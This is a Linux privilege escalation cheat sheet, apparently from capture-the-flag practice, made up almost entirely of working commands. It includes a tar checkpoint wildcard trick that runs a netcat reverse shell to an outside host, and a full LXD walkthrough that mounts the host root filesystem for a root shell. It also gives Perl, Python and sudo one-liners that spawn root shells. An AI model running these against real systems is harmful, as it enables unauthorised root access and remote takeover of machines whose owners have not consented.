# Linux Privesc

[LXD](#lxd),
[Sudo](#sudo),
[Tar](#tar),

----

## Tar
```shell
## Checkpoint privesc
tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint--action=exec='/bin/sh'
```
```shell
## Checkpoint wildcard privesc
echo 'netcat x.x.x.x 4444 -e /bin/sh' > shell.sh
touch '--checkpoint-action=exec=sh shell.sh'
touch '--checkpoint=1'
tar cf backup.tar * 
## tar cf backup.tar --checkpoint=1 --checkpoint-action=exec=sh shell.sh 
```
## LXD
If user in `lxd` group.

```shell
## Initialise LXD
lxd init
```
```shell
## Clone LXC builder
$ git clone https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite.git
$ sudo ./build-alpine 

## Realise it is broken and fix mirrors
$ wget http://dl-cdn.alpinelinux.org/alpine/MIRRORS.txt
$ sudo mkdir /usr/share/alphine-mirrors/
$ cp /usr/share/alpine-mirrors/MIRRORS.txt MIRRORS.txt

## Build will now download
$ sudo ./build-alpine
Determining the latest release... v3.12
Using static apk from http://dl-cdn.alpinelinux.org/alpine//v3.12/main/x86_64
Downloading alpine-mirrors-3.5.10-r0.apk
...
(17/19) Installing libc-utils (0.7.2-r3)
(18/19) Installing alpine-keys (2.2-r0)
(19/19) Installing alpine-base (3.12.0-r0)
Executing busybox-1.31.1-r19.trigger
OK: 8 MiB in 19 packages
```
```shell
## Create python server to upload image to victim
kali@kali:~/Desktop/repos/ctf/tools/lxd-alpine-builder$ ls -lah
total 3.2M
-rw-r--r-- 1 root root 3.1M Sep 27 21:46 alpine-v3.12-x86_64-20200927_2146.tar.gz
kali@kali:~/Desktop/repos/ctf/tools/lxd-alpine-builder$ python3 -m http.server
```
```shell
## Download lxd image with victim shell.
ash@tabby:~$ mkdir alpine
mkdir alpine
ash@tabby:~$ cd alpine
cd alpine
ash@tabby:~/alpine$ wget http://10.10.14.36:8000/alpine-v3.12-x86_64-20200927_2146.tar.gz
<14.36:8000/alpine-v3.12-x86_64-20200927_2146.tar.gz
--2020-09-27 21:11:04--  http://10.10.14.36:8000/alpine-v3.12-x86_64-20200927_2146.tar.gz
Connecting to 10.10.14.36:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3207041 (3.1M) [application/gzip]
Saving to: ‘alpine-v3.12-x86_64-20200927_2146.tar.gz’

alpine-v3.12-x86_64 100%[===================>]   3.06M   731KB/s    in 4.3s    

2020-09-27 21:11:09 (731 KB/s) - ‘alpine-v3.12-x86_64-20200927_2146.tar.gz’ saved [3207041/3207041]
```
```shell
## Import image
ash@tabby:~/alpine$ lxc image import alpine-v3.12-x86_64-20200927_2146.tar.gz --alias loveless
<-v3.12-x86_64-20200927_2146.tar.gz --alias loveless
ash@tabby:~/alpine$ lxc image list
lxc image list
+----------+--------------+--------+-------------------------------+--------------+-----------+--------+------------------------------+
|  ALIAS   | FINGERPRINT  | PUBLIC |          DESCRIPTION          | ARCHITECTURE |   TYPE    |  SIZE  |         UPLOAD DATE          |
+----------+--------------+--------+-------------------------------+--------------+-----------+--------+------------------------------+
| loveless | 9aa953736e7a | no     | alpine v3.12 (20200927_21:46) | x86_64       | CONTAINER | 3.06MB | Sep 27, 2020 at 9:22pm (UTC) |
+----------+--------------+--------+-------------------------------+--------------+-----------+--------+------------------------------+
```
```shell
## Initialise LXD (select all default)
ash@tabby:~/alpine$ lxd init
lxd init
Would you like to use LXD clustering? (yes/no) [default=no]: 
Do you want to configure a new storage pool? (yes/no) [default=yes]: 
Name of the new storage pool [default=default]: mystorage
mystorage
Name of the storage backend to use (ceph, btrfs, dir, lvm) [default=btrfs]: 
Create a new BTRFS pool? (yes/no) [default=yes]: 
Would you like to use an existing block device? (yes/no) [default=no]: 
Size in GB of the new loop device (1GB minimum) [default=15GB]: 
Would you like to connect to a MAAS server? (yes/no) [default=no]: 
Would you like to create a new local network bridge? (yes/no) [default=yes]: 
What should the new bridge be called? [default=lxdbr0]: 
What IPv4 address should be used? (CIDR subnet notation, “auto” or “none”) [default=auto]: 
What IPv6 address should be used? (CIDR subnet notation, “auto” or “none”) [default=auto]: 
Would you like LXD to be available over the network? (yes/no) [default=no]: 
Would you like stale cached images to be updated automatically? (yes/no) [default=yes] 
Would you like a YAML "lxd init" preseed to be printed? (yes/no) [default=no]: 
```
```shell
# Launch the image with privileged security flag.
ash@tabby:~/alpine$ lxc init loveless lovelesscontainer -c security.privileged=true 
<less lovelesscontainer -c security.privileged=true 
Creating lovelesscontainer
```
```shell
# Mount the victim machines `/root` directory to device.
lxc config device add lovelesscontainer host-root disk source=/ path=/mnt/root recursive=true
```
```shell
# Start container
ash@tabby:~/alpine$ lxc start lovelesscontainer
lxc start lovelesscontainer
```
```shell
# Get root shell from container
ash@tabby:~/alpine$ lxc exec lovelesscontainer /bin/sh
lxc exec lovelesscontainer /bin/sh
~ # ^[[38;5R

~ # ^[[38;5Rwhoami
whoami
root
```

## Perl 
__Capabilities__
```shell
## Check capaibilities
getcap / -r 2>/dev/null;
## Look for perl cap_setuid+ep
## Privesc
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
```

## Python

__SUDO__
```shell
sudo python -c 'import pty; pty.spawn("/bin/sh")'
```

__SUID__
```shell
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```
## Sudo

```shell
sudo -u#-1 bash
```